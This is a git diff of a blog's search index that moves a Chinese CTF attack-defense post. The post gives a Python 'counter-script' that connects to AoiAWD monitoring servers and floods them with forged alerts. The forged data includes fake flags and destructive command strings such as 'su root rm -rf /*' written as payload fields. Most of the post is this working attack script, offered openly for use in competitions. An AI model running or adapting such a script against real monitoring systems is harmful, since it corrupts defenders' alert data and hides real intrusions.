+        data3 = &#39;{&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:{&quot;path&quot;:&quot;/update/score_points&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;ZmxhZ3tDcmF6eV9UaHVydGhkYXlfdl9tZV81MH0=&quot;}}\n&#39;
+        data4 = &#39;{&quot;type&quot;:&quot;web&quot;,&quot;data&quot;:{&quot;scipt&quot;:&quot;/var/www/html/rce.php&quot;,&quot;method&quot;:&quot;post&quot;,&quot;uri&quot;:&quot;127.0.0.1/rce.php&quot;,&quot;remote&quot;:&quot;127.0.0.1&quot;,&quot;buffer&quot;:&quot;{\\&quot;flag\\&quot;:\\&quot;flag{Crazy_Thurthday_v_me_50}\\&quot;}&quot;}}\n&#39;
+        data5 = &#39;{&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:{&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;}}\n&#39;
+        data6 = &#39;{&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:{&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;}}\n&#39;
+        data7 = &#39;{&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:{&quot;path&quot;:&quot;/114514&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;c3Ugcm9vdCBybSAtcmYgLyo=&quot;}}\n&#39;
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            try:
+                sock.settimeout(1)
+                sock.connect(server_address)
+                sock.sendall(data.encode(&quot;utf-8&quot;))
+                tmp = sock.recvfrom(1024)
+                if &quot;pong&quot; in str(tmp):
+                    sock.sendall(data2.encode(&quot;utf-8&quot;))
+                    sock.sendall(data3.encode(&quot;utf-8&quot;))
+                    sock.sendall(data4.encode(&quot;utf-8&quot;))
+                    for j in range(60):
+                        sock.sendall(data7.encode(&quot;utf-8&quot;))
+                    sock.sendall(data6.encode(&quot;utf-8&quot;))
+                    sock.sendall(data5.encode(&quot;utf-8&quot;))
+                    print(f&quot;[+] {i}\n&quot;)
+                    sock.close()
+                else:
+                    print(
+                        f&quot;\n[-] --------------------------------{i}-------------------------------------\n&quot;
+                    )
+            except Exception as e:
+                print(f&quot;An error occurred: {e}&quot;)
+ Next
+由于分析了各个 AWD 防御工具(Aoi、wathbird 等)
+决定模仿 aoi、并借鉴其他各个工具
+重写一个基于 go(gin 或 iris 大概率会用 gin)的 AWD 监测防御系统
+但是目前没有时间开发(别问，问就是鸽)
+预计会在 2025 年 5 月问世 ：)
+如果师傅们有留存的各个 AWD 比赛的流量等数据
+以及分析了解过官方 check 机制的师傅
+以及有大量参加 AWD 经验的大师傅
+欢迎联系本菜鸡
+]]></content>
+      <categories>
+        <category>awd</category>
+      </categories>
+      <tags>
+        <tag>awd</tag>
+        <tag>AoiAWD</tag>
+        <tag>反制脚本</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>upload-labs</title>
     <url>/2022/03/upload-labs/</url>
     <content><![CDATA[ pass-01
@@ -3903,87 +3984,6 @@ Content-Disposition: form-data; name=&quot;submit&quot;
         <tag>web</tag>
         <tag>upload</tag>
         <tag>upload-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AoiAWD反制脚本</title>
-    <url>/2024/05/untiAoi/</url>
-    <content><![CDATA[ AoiAWD 反制脚本
- 起因
-在经历过 awd 比赛中 AoiAWD 多次崩溃后(长城杯 虽然最后还是进决赛摸鱼了)
-赛后研究了一下
-开发了这个反制脚本
-由于打点队友喜欢用 gogo
-所以这个脚本支持 gogo 扫描结果
- 思路
-发现后端未验证来自靶机的数据
-因此存在脏数据污染
-针对此开发脚本
-可向 AoiAWD 的各个数据展示页面投放脏数据
-包括告警页面
- 脚本
-再此公布本脚本，希望下次 awd 遇见的时候别打我，谢谢 QAQ
-12345678910111213141516171819202122232425262728293031323334353637383940414243import re
-import socket
-
-f = open(&quot;./ip.txt&quot;, &quot;r+&quot;)
-url_list = f.readlines()
-
-for i in url_list:
-    pattern = r&quot;tcp://(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+)&quot;
-    match = re.search(pattern, i, 0)
-    if match:
-        i = match.group(0).split(&quot;//&quot;)[1]
-        p = int(i.split(&quot;:&quot;)[1])
-        i = i.split(&quot;:&quot;)[0]
-        server_address = (i, p)  # 替换SERVER_IP和SERVER_PORT为实际值
-        data = &#39;{&quot;type&quot;:&quot;ping&quot;}\n&#39;
-        data2 = &#39;{&quot;type&quot;:&quot;new_process&quot;,&quot;data&quot;:{&quot;pid&quot;:&quot;114514&quot;,&quot;ppid&quot;:&quot;114514&quot;,&quot;uid&quot;:&quot;0&quot;,&quot;username&quot;:&quot;root&quot;,&quot;cmd&quot;:&quot;rm -rf /*&quot;,&quot;param&quot;:&quot;su root rm -rf /*&quot;}}\n&#39;
-        data3 = &#39;{&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:{&quot;path&quot;:&quot;/update/score_points&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;ZmxhZ3tDcmF6eV9UaHVydGhkYXlfdl9tZV81MH0=&quot;}}\n&#39;
-        data4 = &#39;{&quot;type&quot;:&quot;web&quot;,&quot;data&quot;:{&quot;scipt&quot;:&quot;/var/www/html/rce.php&quot;,&quot;method&quot;:&quot;post&quot;,&quot;uri&quot;:&quot;127.0.0.1/rce.php&quot;,&quot;remote&quot;:&quot;127.0.0.1&quot;,&quot;buffer&quot;:&quot;{\\&quot;flag\\&quot;:\\&quot;flag{Crazy_Thurthday_v_me_50}\\&quot;}&quot;}}\n&#39;
-        data5 = &#39;{&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:{&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;}}\n&#39;
-        data6 = &#39;{&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:{&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;}}\n&#39;
-        data7 = &#39;{&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:{&quot;path&quot;:&quot;/114514&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;c3Ugcm9vdCBybSAtcmYgLyo=&quot;}}\n&#39;
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-            try:
-                sock.settimeout(1)
-                sock.connect(server_address)
-                sock.sendall(data.encode(&quot;utf-8&quot;))
-                tmp = sock.recvfrom(1024)
-                if &quot;pong&quot; in str(tmp):
-                    sock.sendall(data2.encode(&quot;utf-8&quot;))
-                    sock.sendall(data3.encode(&quot;utf-8&quot;))
-                    sock.sendall(data4.encode(&quot;utf-8&quot;))
-                    for j in range(60):
-                        sock.sendall(data7.encode(&quot;utf-8&quot;))
-                    sock.sendall(data6.encode(&quot;utf-8&quot;))
-                    sock.sendall(data5.encode(&quot;utf-8&quot;))
-                    print(f&quot;[+] {i}\n&quot;)
-                    sock.close()
-                else:
-                    print(
-                        f&quot;\n[-] --------------------------------{i}-------------------------------------\n&quot;
-                    )
-            except Exception as e:
-                print(f&quot;An error occurred: {e}&quot;)
- Next
-由于分析了各个 AWD 防御工具(Aoi、wathbird 等)
-决定模仿 aoi、并借鉴其他各个工具
-重写一个基于 go(gin 或 iris 大概率会用 gin)的 AWD 监测防御系统
-但是目前没有时间开发(别问，问就是鸽)
-预计会在 2025 年 5 月问世 ：)
-如果师傅们有留存的各个 AWD 比赛的流量等数据
-以及分析了解过官方 check 机制的师傅
-以及有大量参加 AWD 经验的大师傅
-欢迎联系本菜鸡
-]]></content>
-      <categories>
-        <category>awd</category>
-      </categories>
-      <tags>
-        <tag>awd</tag>
-        <tag>AoiAWD</tag>
-        <tag>反制脚本</tag>
       </tags>
   </entry>
   <entry>
